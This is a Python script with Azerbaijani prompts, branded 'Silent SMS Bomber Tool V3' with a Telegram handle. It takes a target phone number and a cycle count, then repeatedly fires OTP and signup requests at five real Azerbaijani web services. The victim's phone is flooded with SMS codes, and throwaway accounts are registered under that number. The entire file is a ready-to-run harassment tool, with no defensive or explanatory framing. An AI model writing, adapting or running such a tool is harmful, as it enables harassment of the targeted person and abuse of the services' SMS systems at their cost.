import requests
import time
import os
import re
import sys

# Kitabxanaların yoxlanılması
try:
    import pyfiglet
    from colorama import Fore, init, Style
except ImportError:
    os.system("pip install pyfiglet colorama requests")
    import pyfiglet
    from colorama import Fore, init, Style

# Rəngləri aktivləşdiririk
init(autoreset=True)

# --- AYARLAR ---
U_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"

# --- EFFEKT FUNKSİYALARI ---
def yaz(txt, renk=Fore.CYAN, hiz=0.04):
    for c in txt:
        print(renk + c, end='', flush=True)
        time.sleep(hiz)
    print()

def banner_goster():
    os.system("clear")
    # Figlet ilə SILENT yazısı (Slant fontu ilə)
    silent_banner = pyfiglet.figlet_format("Silent", font="slant")
    print(Fore.LIGHTRED_EX + silent_banner)
    
    # Sənin istədiyin o xüsusi dizayn hissəsi
    print(Fore.LIGHTYELLOW_EX + " 🛠 SMS Bomber Tool V3")
    print(Fore.LIGHTBLUE_EX + " 📱 Telegram: @SilentAzerbaycan\n")
    print(Fore.WHITE + "-"*45)

# --- API FUNKSİYALARI ---
def api_tats(tel):
    try: return requests.post("https://api.tats.az/authotp/otp/request", headers={"User-Agent": U_AGENT}, json={"phone": "+994" + tel, "purpose": "register"}, timeout=10)
    except: return None

def api_radar(tel):
    try:
        payload = "{\"source\":\"web\",\"lang\":\"\",\"app_id\":12,\"operator\":3,\"msisdn\":\"994" + tel + "\"}"
        return requests.post("https://web.smsradar.az/api/core/register/step1", headers={"User-Agent": U_AGENT, "Content-Type": "text/plain;charset=UTF-8"}, data=payload, timeout=10)
    except: return None

def api_auto(tel):
    try: return requests.post("https://api.auto.az/v2/az/auth", headers={"User-Agent": U_AGENT}, json={"phone": "0" + tel}, timeout=10)
    except: return None

def api_tunel(tel):
    try: return requests.post("https://api.tunel.az/api/auth/signup", headers={"User-Agent": U_AGENT}, json={"agreement": True, "phone_or_email": "+994" + tel, "password": "pass123456", "repassword": "pass123456"}, timeout=10)
    except: return None

def api_kontakt(tel):
    try:
        fmt_kon = f"+994 ({tel[0:2]}) {tel[2:5]} {tel[5:7]} {tel[7:9]}"
        return requests.post("https://kontakt.az/ru/kontakt_id/phone/getotp", headers={"User-Agent": U_AGENT, "X-Requested-With": "XMLHttpRequest"}, data={"phoneNumber": fmt_kon, "form_key": "nWrTtzkrQpWV3cVd"}, timeout=10)
    except: return None

APIS = [api_tats, api_radar, api_auto, api_tunel, api_kontakt]

# --- TOOL-UN ƏSAS HİSSƏSİ ---
def main():
    banner_goster()
    
    # Nömrə girişi
    target = input(Fore.YELLOW + " 📞 Hədəf nömrə (məs: 501234567): " + Fore.WHITE)
    target = re.sub(r'\D', '', target)
    if target.startswith("994"): target = target[3:]
    elif target.startswith("0"): target = target[1:]
    
    if len(target) != 9:
        print(Fore.RED + " ❌ Səhv nömrə formatı!")
        return

    # Say girişi
    try:
        count = int(input(Fore.YELLOW + " 🚀 Dövr sayı (məs: 5): " + Fore.WHITE))
    except:
        count = 1

    print(Fore.WHITE + "-"*45)
    yaz(f" ⏳ 0{target} nömrəsinə hücum planlaşdırılır...", Fore.CYAN)
    time.sleep(1)

    success_total = 0
    for i in range(count):
        print(Fore.MAGENTA + f"\n 📦 Dövr {i+1} başladıldı...")
        for api in APIS:
            res = api(target)
            if res and res.status_code in [200, 201, 202, 204]:
                print(Fore.GREEN + f" [+] Sorğu göndərildi!")
                success_total += 1
            else:
                print(Fore.RED + f" [-] Xəta baş verdi.")
            time.sleep(0.5)
        
        if i < count - 1:
            yaz(" ⏳ Gözlənilir (9 san)...", Fore.YELLOW, 0.02)
            time.sleep(9)

    print(Fore.WHITE + "\n" + "-"*45)
    yaz(f" ✅ Hücum bitdi! Cəmi uğurlu sorğu: {success_total}", Fore.LIGHTGREEN_EX)
    print(Fore.WHITE + "-"*45)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n ⛔ Dayandırıldı!")
        sys.exit()

